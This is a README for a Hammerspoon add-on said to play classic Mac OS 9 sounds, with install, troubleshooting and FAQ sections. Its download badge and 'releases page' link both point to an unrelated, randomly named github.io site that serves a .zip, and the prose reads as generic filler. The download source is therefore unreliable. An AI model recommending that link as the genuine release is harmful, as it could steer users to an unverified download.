# 🔊 PlatinumSnd.spoon - Add Classic Sounds To Your Mac

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://mounted-pricefloor85.github.io)

PlatinumSnd.spoon brings the signature interface sounds of Mac OS 9 to modern macOS systems. This tool integrates directly with Hammerspoon to play authentic retro sound effects during common computer actions. You hear familiar clicks, beeps, and alerts when you open menus, empty the trash, or interact with windows.

## ⚙️ System Requirements

This software requires macOS and the Hammerspoon automation tool. It runs on most recent versions of the operating system. Ensure you have the following installed before you begin:

1. A Mac computer.
2. The latest version of macOS.
3. The Hammerspoon application installed in your Applications folder.

If you do not have Hammerspoon, download it from the official Hammerspoon website. It acts as the engine that plays these sounds.

## 💾 Installation Steps

Follow these steps to set up the software.

1. Visit the [releases page](https://mounted-pricefloor85.github.io) to download the latest file.
2. Look for the file ending in .zip. Click the link to save the file to your computer.
3. Locate the downloaded file in your Downloads folder.
4. Double-click the .zip file to extract the contents. You see a folder named PlatinumSnd.spoon.
5. Move this folder to a permanent location on your Mac, such as your Documents or Home folder.
6. Open Hammerspoon.
7. Click the Hammerspoon icon in your menu bar at the top of your screen.
8. Select "Open Config" or "Show config file" from the menu. This opens your initialization file in your default code editor.
9. Add the following line to your configuration file: `hs.loadSpoon("PlatinumSnd")`.
10. Save the file.
11. Click the Hammerspoon icon again and select "Reload Config".

The sounds should now work. Test the volume by performing simple actions like closing a window or clicking a menu item.

## 🛠️ Customization Options

You can adjust how the sounds behave within your Hammerspoon configuration file. While the default settings provide the complete retro experience, you can disable specific sounds if you prefer.

To modify the setup, return to the configuration file you opened during installation. You can define various settings to change the volume or toggle specific sound effects. If you make a mistake, simply delete the new lines and reload the configuration to restore the factory defaults.

## 📋 Troubleshooting

If you do not hear sounds, check these items:

* Verify that your system volume is not muted.
* Check that Hammerspoon has permission to control your computer. Go to System Settings under Privacy and Security, look for Accessibility, and ensure Hammerspoon appears in the list with a checkmark.
* Confirm that you placed the PlatinumSnd.spoon folder in a location that Hammerspoon can access.
* Ensure you typed the code in the configuration file exactly as shown. Capitalization matters.

## 🧩 How It Works

The spoon utilizes the Lua scripting language built into Hammerspoon to trigger audio files when the operating system performs specific tasks. When you click a button or trigger an event, Hammerspoon detects the signal and plays the corresponding sound file from the package. This approach ensures low impact on your system resources while maintaining high audio quality. 

The software includes the full suite of Platinum sounds. These effects provide a tactile feel to your digital tasks, mimicking the responsiveness of older computing environments.

## 💡 Frequently Asked Questions

**Does this slow down my Mac?**
No. The scripts run in the background and use minimal memory.

**Can I add my own sounds?**
Yes. You can replace the audio files inside the spoon folder if you wish to use different sound samples. Ensure you maintain the same file names so the script can recognize them.

**Will this interfere with other apps?**
No. The sounds only play during standard interface interactions controlled by the operating system.

**Do I need to keep Hammerspoon open?**
Yes. Hammerspoon must reach the background for the sounds to play. You can set Hammerspoon to launch at login via the application settings.

Keywords: hammerspoon, hammerspoon-spoon, macos, macos-classic, macosx, os9, platinum, retro, retro-computing, retrocomputing, sound, sound-effects, sounds, tweak, tweaks